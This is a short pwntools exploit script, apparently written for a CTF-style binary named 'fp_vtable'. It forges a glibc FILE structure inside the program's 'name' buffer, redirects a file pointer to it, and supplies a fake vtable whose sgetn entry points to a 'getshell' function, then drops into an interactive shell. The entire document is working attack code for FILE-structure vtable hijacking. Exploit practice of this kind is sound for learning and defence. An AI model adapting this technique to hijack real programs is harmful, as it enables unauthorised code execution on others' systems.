#fp_test.py
from pwn import *
p = process("./fp_vtable")
elf = ELF("fp_vtable")

name_buf = elf.symbols['name']
getshell = elf.symbols['getshell']

name = p64(0xfbad2488)
name += p64(0)*13
name += p64(3)
name += p64(0)*2
name += p64(name_buf + 0xe0)
name += p64(0xffffffffffffffff)
name += p64(0)*8
# name += p64(0x41414141) # vtable
name += p64(0x6011b0) # vtable

name += "\x00"*(256-len(name))
name += p64(name_buf)

# fake vtable
name += p64(0) # padding
name += "\x90"*0x40
name += p64(getshell) # sgetn location [rax+0x40]
pause()
print p.sendlineafter("Name:", str(name))


p.interactive()